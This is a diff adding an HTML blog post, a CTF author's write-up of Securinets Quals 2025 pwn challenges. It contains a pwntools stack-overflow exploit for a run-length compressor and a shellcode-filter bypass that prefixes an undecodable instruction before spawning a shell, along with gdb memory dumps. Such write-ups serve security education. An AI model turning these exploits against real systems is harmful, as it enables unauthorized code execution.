@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="assets/images/luffy.jpg" sizes="any">
+    <link rel="icon" href="assets/images/luffy.jpg" type="image/svg+xml">
+    <link rel="stylesheet" href="/assets/styles/global.css">
+    <title>Securinets Quals 2025 | PWN writeups | Buddurid's blog</title>
+
+    <!-- SEO Metadata -->
+    <meta property="og:title" content="Securinets Quals 2025 | PWN writeups | Buddurid's blog" />
+    <meta property="og:site_name" content="Buddurid's blog" />
+    <meta property="description" content="writeups for the 5 pwn challanges i authored ." />
+    <meta property="og:description" content="writeups for the 5 pwn challanges i authored ." />
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:4000/assets/images/luffy.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#FFBD3F" />
+    <link rel="canonical" href="http://localhost:4000/2025/10/04/Securinets-Quals-2025" />
+
+    <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+</head>
+<body><div class="load" id="load">
+    <pre class="term" id="term">buddurid@CTF:~$ </pre>
+    <script src="/assets/splashscreen.js"></script>
+</div><nav class="open">
+    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
+        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
+    </div>
+    <ul>
+        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
+                <a href="/"
+                   title="Me">Me</a>
+            </li><li style="z-index: 1;">
+                <a href="/blog"
+                   title="Blog"highlighted>Blog</a>
+            </li><li >
+                <a href="/ctfs"
+                   title="CTFs">CTFs</a>
+            </li></ul>
+
+</nav>
+
+<div class="nav-toggle hamburger-container">
+    <div class="hamburger-button"></div>
+</div>
+
+
+<script>
+    const responsiveNavThreshold = 500;
+    const navOpener = document.querySelector('.nav-toggle');
+    const nav = document.querySelector('nav');
+
+    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);
+
+    navOpener.addEventListener('click', () => {
+        toggle(nav.classList, 'open');
+    });
+
+    let enabled = false;
+
+    const setResponsive = () => {
+        if (window.innerWidth < responsiveNavThreshold) {
+            if (enabled) return;
+            enabled = true;
+            nav.classList.remove('open');
+            navOpener.classList.add('enabled');
+        }
+        else {
+            if (!enabled) return;
+            enabled = false;
+            nav.classList.add('open');
+            navOpener.classList.remove('enabled');
+        }
+    };
+    setResponsive();
+    window.addEventListener('resize', setResponsive);
+</script>
+<div class="content">
+            <main>
+                <article>
+    <h1 class="post-title">Securinets Quals 2025 | PWN writeups</h1>
+    <p class="post-author-date"><b></b><em> - October 4, 2025</em></p>
+
+
+    <div class="tags">
+
+        <strong>Categories: </strong>
+
+        
+        <span>bof</span>
+        
+        <span>fsop</span>
+        
+        <span>v8</span>
+        
+        <span>_chain</span>
+        
+
+    </div>
+
+    <p><i>writeups for the 5 pwn challanges i authored .</i></p>
+
+    <hr>
+
+    <p>Securinets Quals is a qualifier ctf for the finals ctf that gets held onsite in tunisia . For this year , alongside my friend retr0 , we authored 5 pwn challs with different types .</p>
+
+<h1 id="zip">Zip++</h1>
+
+<h3 id="tldr">tldr</h3>
+
+<p>this is a warmup challenge , although it’s easy , i didn’t expect it to get solved in 5 minutes xd</p>
+
+<h3 id="code">code</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">768</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-610h] BYREF</span>
+  <span class="n">_BYTE</span> <span class="n">v2</span><span class="p">[</span><span class="mi">772</span><span class="p">];</span> <span class="c1">// [rsp+300h] [rbp-310h] BYREF</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+604h] [rbp-Ch]</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+608h] [rbp-8h]</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+60Ch] [rbp-4h]</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x300uLL</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"data to compress : "</span><span class="p">);</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x300uLL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"exit"</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"compressed data  : "</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"%02X"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v2</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_402043</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">compress</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">_BYTE</span> <span class="n">v4</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="c1">// [rsp+1Bh] [rbp-Dh]</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-8h]</span>
+  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-4h]</span>
+
+  <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="n">a1</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;</span> <span class="n">a2</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">254</span> <span class="o">&amp;&amp;</span> <span class="n">v6</span> <span class="o">&lt;</span> <span class="n">a2</span> <span class="o">&amp;&amp;</span> <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">a1</span><span class="p">[</span><span class="n">v6</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">++*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+      <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v5</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1LL</span> <span class="o">+</span> <span class="n">a3</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="n">v5</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="n">v4</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">a1</span><span class="p">[</span><span class="n">v6</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>what the program does is takes your input , compresses it then prints the compressed data in hex format</li>
+  <li>the compression algorithm works like this : it simply stores the byte the it’s number of his successif occurences , so <code class="language-plaintext highlighter-rouge">"abbccc"</code> will become : <code class="language-plaintext highlighter-rouge">"a\x01b\x02c\x03"</code></li>
+  <li>input data is a stack variable of size 0x300 and the output (the compressed data) is also of size 0x300 , because why would the compressed data be larger than the data that got compressed no ?</li>
+</ul>
+
+<h3 id="bugs-">bugs :</h3>
+
+<ul>
+  <li>the number of successif occurences of a char is considered an uint_8 here so <code class="language-plaintext highlighter-rouge">"a"*0x100</code> will decompress into <code class="language-plaintext highlighter-rouge">"a\x00"</code> because it will overflow back into 0</li>
+  <li>the assumption that <code class="language-plaintext highlighter-rouge">len(compressed_data)&lt;len(original_data)</code> here is wrong because we can use this pattern <code class="language-plaintext highlighter-rouge">"ab"</code> and we will get <code class="language-plaintext highlighter-rouge">"a\x01b\x01"</code> , in other words we compressed 2 bytes into 4 xdd . What a scam</li>
+  <li>now we can leverage this stack overflow to write our win function address . let’s say we wanna write this sequence of bytes <code class="language-plaintext highlighter-rouge">"\x61\x04"</code> , we need to provide this data to compress <code class="language-plaintext highlighter-rouge">"\x61"*4</code> . Just like this we can Write anything we want , even null bytes . Which we will need because the ret address is pointing to <code class="language-plaintext highlighter-rouge">libc_start_main</code> which is 6 bytes , if want it to point to point to <code class="language-plaintext highlighter-rouge">win</code> address which is 4 bytes we have to null out those extra 2 bytes</li>
+</ul>
+
+<h3 id="exploit">exploit</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* vuln+276
+                           b* compress
+                           b* win
+                        c
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc pwn-14caf623.p1.securinets.tn 9000"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+<span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">n</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
+        <span class="n">res</span><span class="o">=</span><span class="sa">b</span><span class="s">""</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="o">//</span><span class="mi">2</span><span class="p">):</span>
+                <span class="n">char</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span>
+                <span class="n">repetition</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xff</span>
+                <span class="k">if</span> <span class="n">repetition</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
+                        <span class="n">repetition</span><span class="o">=</span><span class="mi">256</span>
+                <span class="n">res</span><span class="o">+=</span><span class="n">p8</span><span class="p">(</span><span class="n">char</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">repetition</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">res</span>
+
+
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"data to compress :"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"ab"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x318</span><span class="o">//</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">encode</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"win"</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>  <span class="c1">## writes only lower 2 bytes
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"data to compress :"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"exit"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="push-pull-pops--push-pull-pops-revenge">Push Pull Pops &amp; Push Pull Pops Revenge</h1>
+
+<h3 id="tldr-">tldr :</h3>
+
+<p>shellcode with only <code class="language-plaintext highlighter-rouge">pop reg</code> and <code class="language-plaintext highlighter-rouge">push reg</code></p>
+
+<h3 id="storyline">storyline</h3>
+
+<ul>
+  <li>i make a challenge</li>
+  <li>it gets solved unintendedly</li>
+  <li>monkey sad</li>
+  <li>i upload a revenge challenge preventing that unintended solution</li>
+</ul>
+
+<h3 id="initial-code">initial code</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/local/bin/python3
+</span><span class="kn">import</span> <span class="nn">mmap</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">capstone</span> <span class="kn">import</span> <span class="n">Cs</span><span class="p">,</span> <span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span>
+<span class="kn">from</span> <span class="nn">capstone.x86</span> <span class="kn">import</span> <span class="n">X86_GRP_AVX2</span>
+<span class="kn">from</span> <span class="nn">capstone</span> <span class="kn">import</span> <span class="n">CS_OP_REG</span>
+
+
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">code</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x2000</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">code_len</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+    <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span><span class="p">(</span><span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span><span class="p">)</span>
+    <span class="n">md</span><span class="p">.</span><span class="n">detail</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">decoded</span><span class="o">=</span><span class="mi">0</span>
+    <span class="k">for</span> <span class="n">insn</span> <span class="ow">in</span> <span class="n">md</span><span class="p">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mi">0</span><span class="p">):</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">insn</span><span class="p">.</span><span class="n">insn_name</span><span class="p">()</span>
+        <span class="n">decoded</span><span class="o">+=</span><span class="n">insn</span><span class="p">.</span><span class="n">size</span>
+        <span class="k">if</span> <span class="n">name</span><span class="o">!=</span><span class="s">"pop"</span> <span class="ow">and</span> <span class="n">name</span><span class="o">!=</span><span class="s">"push"</span> <span class="p">:</span>
+            <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="s">"int3"</span> <span class="p">:</span>
+                <span class="k">continue</span>
+            <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">if</span> <span class="n">insn</span><span class="p">.</span><span class="n">operands</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nb">type</span><span class="o">!=</span><span class="n">CS_OP_REG</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">if</span> <span class="n">decoded</span><span class="o">!=</span><span class="n">code_len</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"nice try"</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">code</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+
+    <span class="c1"># Allocate executable memory using mmap
+</span>
+    <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">.</span><span class="n">mmap</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="n">prot</span><span class="o">=</span><span class="n">mmap</span><span class="p">.</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">mmap</span><span class="p">.</span><span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">mmap</span><span class="p">.</span><span class="n">PROT_EXEC</span><span class="p">)</span>
+    <span class="n">mem</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+    <span class="c1"># Create function pointer and execute
+</span>    <span class="n">func</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">)(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">addressof</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_char</span><span class="p">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">mem</span><span class="p">)))</span>
+    <span class="n">func</span><span class="p">()</span>
+
+    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Shellcode : "</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+            <span class="n">run</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"check failed"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Exception type :"</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Exception text :"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<ul>
+  <li>this program reads your shellcode</li>
+  <li>disassembles it with capstone , check every instruction whether its a pop or push and if yes makes sure the operand is a <code class="language-plaintext highlighter-rouge">reg</code> . i also enabled int 3 to trigger breakpoint just to ease debugging and because it is useless in remote .</li>
+  <li>if the checks pass , mmap an <code class="language-plaintext highlighter-rouge">rwx</code> region then paste your shellcode in it then executes it</li>
+</ul>
+
+<p>or that’s what i thought xdd</p>
+
+<h3 id="unintended-solve-solve-for-first-challenge-">unintended solve (solve for first challenge) :</h3>
+
+<ul>
+  <li>capstone stops when encountring bad instructions or instructions it doesnt understand . which means , if we pass this type of instruction at first , the disasm will return an empty array then neglects the checks</li>
+  <li>one of these instructions is <code class="language-plaintext highlighter-rouge">movsxd ecx, eax</code> which translates to <code class="language-plaintext highlighter-rouge">\x63\xc8</code> , so you can just do this</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x63\xc8</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+</code></pre></div></div>
+
+<ul>
+  <li>i also saw some variants of this attack but they share the same idea and this is by far the coolest one .</li>
+</ul>
+
+<h3 id="intended-solve-revenge">intended solve (revenge):</h3>
+
+<ul>
+  <li>we should look to trigger a read syscall , we can deal with rax and with the parameters by just pushing and popping from stack and registers</li>
+  <li>we can <code class="language-plaintext highlighter-rouge">pop rsp</code> to pivot the stack tou our input which we can overwrite because its ‘rwx’</li>
+  <li>now all we need is to get the value <code class="language-plaintext highlighter-rouge">0x0f05</code> which is the <code class="language-plaintext highlighter-rouge">syscall</code> instruction</li>
+  <li>what we can do simply find a pointer in memory that points to this sequence of bytes , or at least at a certain offset (positive offset) , so we can pop our way through</li>
+  <li>we need this region where we have this bytes sequence to be writeable so we can ` push rwx , pop rsp` to pivot to our input</li>
+  <li>since we’re inside a python executable , there are a bunch of extra memory segments, so we can for sure find a pointer in rsp that points to or is below our sequence .</li>
+  <li>we also need to find a stable and reliable pointer .</li>
+</ul>
+
+<h3 id="solver-">solver :</h3>
+
+<p>to automate this i wrote a gdb script that :</p>
+
+<ol>
+  <li>uses <code class="language-plaintext highlighter-rouge">search-pattern</code> function from gdb to look of all occurnces of the sequence , then only grep the rw- ones</li>
+  <li>gets a bunch of values from the stack</li>
+  <li>iterate over all values on the stack to check if there is a value that has this condition <code class="language-plaintext highlighter-rouge">segment_pointer-value_from_stack &lt; 0xd000</code> this way it’s relatively close and we can get to it .</li>
+  <li>now execute the script and look for repeating patterns</li>
+</ol>
+
+<p>Below are 3 different dumps from 3 different excutions from the docker</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] found 0x55ded80d83e0 at offset 0x80 which leads to 0x55ded80e5415 with differnce  0xd035
+[+] found 0x55ded801de00 at offset 0xf0 which leads to 0x55ded802b6b9 with differnce  0xd8b9
+[+] found 0x55ded801de00 at offset 0x160 which leads to 0x55ded802b6b9 with differnce  0xd8b9
+[+] found 0x55ded801e1a0 at offset 0x1a8 which leads to 0x55ded802b6b9 with differnce  0xd519
+[+] found 0x55ded80d83e0 at offset 0x228 which leads to 0x55ded80e5415 with differnce  0xd035
+[+] found 0x55ded801e1c0 at offset 0x248 which leads to 0x55ded802b6b9 with differnce  0xd4f9
+[+] found 0x55ded80d83e0 at offset 0x268 which leads to 0x55ded80e5415 with differnce  0xd035
+[+] found 0x55ded80d83e0 at offset 0x2b0 which leads to 0x55ded80e5415 with differnce  0xd035
+[+] found 0x55ded801ce20 at offset 0x2c8 which leads to 0x55ded802b6b9 with differnce  0xe899
+[+] found 0x55ded801ca80 at offset 0x2e0 which leads to 0x55ded802b6b9 with differnce  0xec39
+[+] found 0x55ded80d8780 at offset 0x340 which leads to 0x55ded80e5415 with differnce  0xcc95
+[+] found 0x55ded80d83e0 at offset 0x348 which leads to 0x55ded80e5415 with differnce  0xd035
+[+] found 0x7f9251c27a60 at offset 0x498 which leads to 0x7f9251c2ba71 with differnce  0x4011
+[+] found 0x7f9251c27a60 at offset 0x498 which leads to 0x7f9251c2e6d9 with differnce  0x6c79
+
+---------------------------------------------------------------
+
